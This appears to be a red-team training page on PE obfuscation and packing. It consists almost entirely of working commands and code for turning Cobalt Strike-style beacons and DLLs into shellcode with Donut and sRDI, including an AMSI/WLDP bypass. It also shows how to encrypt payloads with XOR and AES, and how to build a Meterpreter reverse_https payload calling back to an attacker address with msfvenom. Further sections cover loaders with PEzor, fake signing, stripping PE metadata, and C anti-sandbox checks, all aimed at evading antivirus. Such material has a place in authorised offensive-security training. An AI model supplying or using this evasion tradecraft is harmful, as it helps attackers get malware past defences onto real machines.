---
layout: training-page
title: "PE Obfuscation & Packing — Red Team Academy"
module: "Evasion"
tags:
  - pe-obfuscation
  - packing
  - shellcode
  - donut
  - pe-to-shellcode
page_key: "evasion-pe-obfuscation"
render_with_liquid: false
---

# PE Obfuscation & Shellcode Generation

Converting PE files (EXE/DLL) to shellcode, encrypting payloads, and applying transformations to defeat static signature detection. Key tools: Donut (PE→shellcode), pe2sh, sRDI, Shikata Ga Nai for polymorphism, and custom PE packers. Goal: make the binary unrecognizable to static AV while preserving execution.

## Donut — PE to Shellcode

```
# Donut converts .NET assemblies, EXE, DLL → position-independent shellcode
# Shellcode runs in-memory without touching disk
git clone https://github.com/TheWover/donut
cd donut && make

# Convert EXE to shellcode:
./donut -f 1 -i beacon.exe -o beacon.bin
# -f 1 = output format (1=raw, 2=base64, 3=c, 4=ruby, 5=python, 6=powershell)

# Convert .NET assembly (with arguments):
./donut -i Seatbelt.exe -o seatbelt.bin -p "AntiVirus TokenPrivileges"

# Convert DLL with exported function:
./donut -i evil.dll -e RunFunction -o evil.bin

# Compress + encrypt (built-in):
./donut -i beacon.exe -o beacon.bin -z 2 -b 1
# -z 2 = LZNT1 compression
# -b 1 = AMSI/WLDP bypass

# Output shellcode stats:
./donut -i beacon.exe -o beacon.bin -v

# Then inject beacon.bin via any shellcode injector
```

## sRDI — Shellcode Reflective DLL Injection

```
# sRDI converts any DLL to shellcode that self-loads
git clone https://github.com/monoxgas/sRDI
cd sRDI/Python

# Convert DLL to shellcode:
python3 ConvertToShellcode.py evil.dll
# Outputs: evil_shellcode.bin

# With specific export function:
python3 ConvertToShellcode.py evil.dll --function RunMe

# Integrate in loader:
# Load sRDI shellcode as you would any shellcode
# When executed, it reflectively loads the DLL without touching disk

# C# wrapper usage:
import ShellcodeRDI
shellcode = ShellcodeRDI.ConvertToShellcode(open("evil.dll","rb").read())
```

## Payload Encryption & Encoding

```
# XOR encryption (simple):
python3 -c "
import os
key = os.urandom(16)
with open('beacon.bin', 'rb') as f:
    payload = f.read()
encrypted = bytes(b ^ key[i % len(key)] for i, b in enumerate(payload))
with open('encrypted.bin', 'wb') as f:
    f.write(encrypted)
print('Key:', key.hex())
"

# AES-256 encryption:
python3 -c "
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import os

key = get_random_bytes(32)  # AES-256
iv = get_random_bytes(16)

with open('beacon.bin', 'rb') as f:
    data = f.read()

# Pad to block size:
pad_len = 16 - (len(data) % 16)
data += bytes([pad_len] * pad_len)

cipher = AES.new(key, AES.MODE_CBC, iv)
encrypted = cipher.encrypt(data)

with open('encrypted_payload.bin', 'wb') as f:
    f.write(iv + encrypted)
print('Key:', key.hex())
"

# RC4 using SystemFunction032 (built into Windows):
# No crypto DLL import needed — just advapi32
# See sleep-obfuscation page for SystemFunction032 usage
```

## Shikata Ga Nai & Polymorphism

```
# Shikata Ga Nai — msfvenom's polymorphic XOR encoder
# Generates decoder stub + XOR-encoded payload
# Stub is polymorphic — different each time

msfvenom -p windows/x64/meterpreter/reverse_https \
  LHOST=192.168.1.100 LPORT=443 \
  -e x64/shikata_ga_nai -i 10 \   # 10 encoding iterations
  -f raw -o payload.bin

# Multiple encoding:
msfvenom -p windows/x64/meterpreter/reverse_https \
  LHOST=192.168.1.100 LPORT=443 \
  -e x64/shikata_ga_nai -i 3 \
  -e x64/xor_dynamic -i 2 \
  -f raw -o payload.bin

# Custom encoder (Python):
python3 -c "
import struct, random
payload = open('shellcode.bin','rb').read()
key = random.randint(1, 255)
encoded = bytes([b ^ key for b in payload])
# Generate decoder stub that XORs key over encoded bytes
decoder = b'...'  # write decoder in asm
print(f'Key: {hex(key)}')
"
```

## PE Morphing & Import Table Obfuscation

```
# Use PEzor for automatic PE obfuscation + injection:
git clone https://github.com/phra/PEzor
cd PEzor && bash install.sh

# Inject shellcode with obfuscation:
PEzor.sh -inject beacon.bin -sleep 5 -syscall
# -sleep 5 = sleep 5 seconds before exec (AV sandbox bypass)
# -syscall = use direct syscalls

# Convert shellcode to self-contained EXE:
PEzor.sh beacon.bin -sgn   # sign with fake cert
PEzor.sh beacon.bin -antidebug -antivm

# Nim-based loaders (popular for evasion):
# NimPackt, NimCrypt, NimlineWhispers
nim c --opt:speed -d:strip nimloader.nim
# Nim is less commonly flagged than C# or PowerShell

# Go loaders:
# Freeze, GolangBypassLoader
GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" loader.go
```

## Stomping PE Characteristics

```
# Tools that check PE metadata as IOCs:
# - Rich header (compiler fingerprint)
# - TimeDateStamp
# - Debug directory
# - Checksum

# Remove/randomize these to thwart static AV:
python3 -c "
import pefile, random, time

pe = pefile.PE('payload.exe')

# Zero out Rich header:
pe.RICH_HEADER.clear_checksum = 0

# Randomize compile timestamp:
pe.FILE_HEADER.TimeDateStamp = random.randint(0x40000000, 0x5FFFFFFF)

# Remove debug directory:
# Find and zero debug data directory entry

pe.write('clean_payload.exe')
"

# pe-bear or CFF Explorer (GUI) for manual PE editing

# Strip strings (sensitive IoCs):
strings payload.exe | grep -i "cobalt\|beacon\|sleep\|mutex"
# Use obfuscated string construction in C:
// Instead of: char* s = "beacon";
// Use: char s[] = {'b','e','a','c','o','n',0};
```

## Anti-Sandbox & Anti-Analysis

```
# Common sandbox detection:
# - Check number of running processes (sandboxes have few)
# - Check CPU core count (sandboxes often = 1)
# - Sleep and check elapsed time (sandboxes accelerate sleep)
# - Check for analysis tools: OllyDbg, x64dbg, ProcMon, Wireshark

// C implementation:
// CPU cores:
SYSTEM_INFO si;
GetSystemInfo(&si);
if (si.dwNumberOfProcessors < 2) exit(0);

// Sleep timing check:
ULONGLONG t1 = GetTickCount64();
Sleep(5000);
if (GetTickCount64() - t1 < 4500) exit(0);  // accelerated → sandbox

// Process count:
DWORD procs[1024];
DWORD cbNeeded;
EnumProcesses(procs, sizeof(procs), &cbNeeded);
if (cbNeeded / sizeof(DWORD) < 20) exit(0);  // too few processes
```

## Resources

- Donut — `github.com/TheWover/donut`
- sRDI — `github.com/monoxgas/sRDI`
- PEzor — `github.com/phra/PEzor`
- Freeze — `github.com/optiv/Freeze` — Go shellcode loader
- NimPackt — `github.com/chvancooten/NimPackt-v1`
- Sektor7 — Malware Development course series
